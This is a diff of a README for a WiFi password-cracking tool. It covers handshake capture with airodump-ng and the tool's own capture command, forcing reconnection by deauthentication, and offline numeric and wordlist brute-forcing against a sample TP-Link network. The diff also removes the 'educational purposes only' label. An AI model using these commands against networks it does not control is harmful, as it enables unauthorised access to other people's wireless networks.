@@ -8,7 +8,7 @@
 [![Platform](https://img.shields.io/badge/Platform-macOS%20|%20Linux%20|%20Windows-lightgrey.svg)](#)
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
-**WPA/WPA2 Offline Cracking Tool - Educational purposes only**
+**All-in-One WiFi Security Tool: Capture & Crack**
 
 **Performance:** 5,000-50,000 pwd/sec (offline handshake cracking) 🚀
 
@@ -32,35 +32,24 @@
 
 ## ⚡ Quick Start
 
-### Step 1: Capture WPA/WPA2 Handshake
+### Step 1: Capture Handshake
 
 ```bash
-# Put WiFi interface in monitor mode (Linux)
-sudo airmon-ng start wlan0
-
-# Capture handshake (this creates capture-01.cap file)
-sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
-
-# In another terminal, deauth a client to force reconnection
-sudo aireplay-ng -0 2 -a 00:11:22:33:44:55 wlan0mon
+# Capture specific channel to a file (stop with Ctrl+C or --duration)
+sudo bruteforce-wifi capture --interface en0 --channel 6 --output handshake.cap
 ```
 
-### Step 2: Crack Offline (No Conversion Needed!)
+*Note: You need to wait for a device to connect to the network to capture the handshake.*
 
-**Direct .cap file support** - no need to convert to JSON:
+### Step 2: Crack Offline
 
 ```bash
-# Numeric attack (8 digits) with .cap file
-bruteforce-wifi crack numeric capture-01.cap --ssid "TP-Link_5GHz" --min 8 --max 8
+# Numeric attack (8 digits)
+bruteforce-wifi crack numeric handshake.cap --ssid "TP-Link_5GHz" --min 8 --max 8
 
-# Wordlist attack with .cap file
-bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
-
-# Use JSON format (optional)
-bruteforce-wifi crack numeric handshake.json --min 8 --max 8
+# Wordlist attack
+bruteforce-wifi crack wordlist handshake.cap --ssid "TP-Link_5GHz" rockyou.txt
 ```
-
-**That's it!** The tool automatically parses .cap/.pcap files and extracts the handshake.
 
 ---
 
@@ -98,18 +87,25 @@ We capture frames 1-4, which contain:
 ### Password Verification Algorithm
 
 ```rust
-// 1. Calculate PMK (expensive: 4096 iterations of HMAC-SHA1)
-PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096, 256 bits)
+// 1. Calculate PMK (expensive: 4096 iterations)
+//    - WPA2: PBKDF2-HMAC-SHA1
+//    - WPA2-SHA256 / WPA3-Transition: PBKDF2-HMAC-SHA256
+PMK = PBKDF2(password, SSID, 4096, 256 bits)
 
 // 2. Calculate PTK
-PTK = PRF-512(PMK, "Pairwise key expansion",
-              AA || SPA || ANonce || SNonce)
+//    - WPA2: PRF-512 (SHA1)
+//    - WPA2-SHA256: KDF-SHA256
+PTK = PRF(PMK, "Pairwise key expansion",
+          AA || SPA || ANonce || SNonce)
 
 // 3. Extract KCK (first 16 bytes of PTK)
 KCK = PTK[0..16]
 
 // 4. Calculate MIC
-calculated_MIC = HMAC-SHA1(KCK, EAPOL_frame)
+//    - WPA: HMAC-MD5
+//    - WPA2: HMAC-SHA1
+//    - WPA2-SHA256 / WPA3-Transition: AES-128-CMAC
+calculated_MIC = MIC_ALGO(KCK, EAPOL_frame)
 
 // 5. Compare
 if calculated_MIC == captured_MIC:
@@ -122,42 +118,28 @@ if calculated_MIC == captured_MIC:
 
 ### Scenario: Crack TP-Link Router with 8-Digit Password
 
-#### 1. Identify Target Network
+#### 1. Preparation
 
-Use your system's WiFi tools or `iwlist scan` to find the target network:
+Identify your target network's channel and BSSID using system tools (e.g., `airport -s` on macOS or `iwlist` on Linux).
+
+#### 2. Capture Traffic
+
+**Using bruteforce-wifi:**
 
 ```bash
-# Scan for networks (Linux)
-sudo iwlist wlan0 scan | grep -E "ESSID|Address|Channel"
+sudo bruteforce-wifi capture --interface wlan0 --channel 6 --output capture.cap
 ```
 
-Find:
-- SSID: `TP-Link_5GHz`
-- BSSID (AP MAC): `14:CC:20:XX:XX:XX`
-- Channel: `6`
-
-#### 2. Capture WPA/WPA2 Handshake
-
-**On Linux:**
+**Alternative (Linux/airodump-ng):**
 
 ```bash
 # Start monitor mode
 sudo airmon-ng start wlan0
-# Interface is now wlan0mon
-
-# Capture on channel 6 (TP-Link's channel)
+# Capture on channel 6
 sudo airodump-ng -c 6 --bssid 14:CC:20:XX:XX:XX -w capture wlan0mon
-
-# Wait for "WPA handshake" message or force it:
-# In another terminal, deauth a connected client
-sudo aireplay-ng -0 5 -a 14:CC:20:XX:XX:XX wlan0mon
-
-# Stop capture when you see "WPA handshake: 14:CC:20:XX:XX:XX"
-# File saved as: capture-01.cap
 ```
 
-**On macOS/Windows:**
-Use Wireshark to capture packets or run a Linux VM with aircrack-ng tools.
+In another terminal, you may need to force a reconnection (deauth) to capture the handshake quickly.
 
 #### 3. Crack the Password
 
@@ -217,6 +199,7 @@ bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
 
 - 🚀 **5,000-50,000 pwd/sec** - No network delays, pure CPU power
 - 🔒 **Capture once, crack anywhere** - Work completely offline
+- 🔐 **WPA/WPA2/WPA3 Support** - Supports WPA (MD5), WPA2 (SHA1), and WPA3-Transition/WPA2-SHA256 (AES-CMAC)
 - 🧵 **Multi-threaded** - Scales with CPU cores (optimal parallel processing)
 - 📊 **Real-time progress** - Live throughput stats and ETA
 - 💾 **Minimal memory** - ~15 MB footprint with zero-allocation crypto
@@ -239,50 +222,6 @@ bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
 - ✅ **macOS** (10.15+ Catalina)
 - ✅ **Linux** (any distro with NetworkManager)
 - ✅ **Windows** (10/11)
-
----
-
-## 📊 Performance Benchmarks
-
-### Hardware: Apple M1 Pro (8 cores)
-
-```text
-Offline WPA/WPA2 Cracking:  23,000 passwords/second
-Binary Size:                  2.1 MB (optimized)
-Memory Usage:                ~15 MB
-
-Time Estimates (Offline Mode):
-  4 digits (10K):         ~0.4 seconds
-  6 digits (1M):          ~43 seconds
-  8 digits (100M):        ~1.2 hours
-  10 digits (10B):        ~5 days
-
-Note: Performance varies by CPU. Modern 8-core CPU:
-- Intel i7/i9: 15,000-25,000 pwd/sec
-- AMD Ryzen: 18,000-30,000 pwd/sec
-- Apple M1/M2: 20,000-35,000 pwd/sec
-```
-
-### Why So Fast?
-
-| Optimization | Impact |
-|--------------|--------|
-| Offline cracking (no WiFi) | 50-500x faster |
-| Parallel PBKDF2 | 8x faster (8 cores) |
-| Zero-allocation crypto | 1.8x faster |
-| Efficient batching | 1.5x faster |
-| Lock-free atomics | 1.2x faster |
-| Inline hot paths | 1.1x faster |
-
-**Code-level optimizations:**
-
-- Stack buffers instead of heap allocations in PRF-512
-- Fixed-size arrays for MIC calculations (no Vec)
-- Specialized constant-time comparison for 16-byte MIC
-- Aggressive inlining of cryptographic primitives
-- Minimal memory footprint (~15 MB)
-
-**Total speedup: ~500-10,000x vs online attacks**
 
 ---
 
@@ -318,19 +257,13 @@ cargo install --git https://github.com/maxgfr/bruteforce-wifi
 
 ## 🎮 Usage
 
-### List WiFi Networks
-
-```bash
-sudo bruteforce-wifi list
-```
-
 ### Capture Handshake
 
 ```bash
-# Note: Automatic capture coming soon
-# For now, use airodump-ng manually (Linux only)
+# Capture traffic
+sudo bruteforce-wifi capture --interface wlan0 --channel 6 --output handshake.cap
 
-bruteforce-wifi capture --ssid "TP-Link_5GHz" --output handshake.json
+# For now, if automatic capture has issues, use airodump-ng manually.
 ```
 
 This creates an example JSON file. Replace with your actual captured handshake.
@@ -420,13 +353,6 @@ bruteforce-wifi crack numeric handshake.json --min 8 --max 8 --threads 16
 
 # Use all cores (default)
 bruteforce-wifi crack numeric handshake.json --min 8 --max 8
-```
-
-### Benchmark Mode
-
-```bash
-# Time how long it takes to test 1 million passwords
-time bruteforce-wifi crack numeric test_handshake.json --min 6 --max 6
 ```
 
 ---
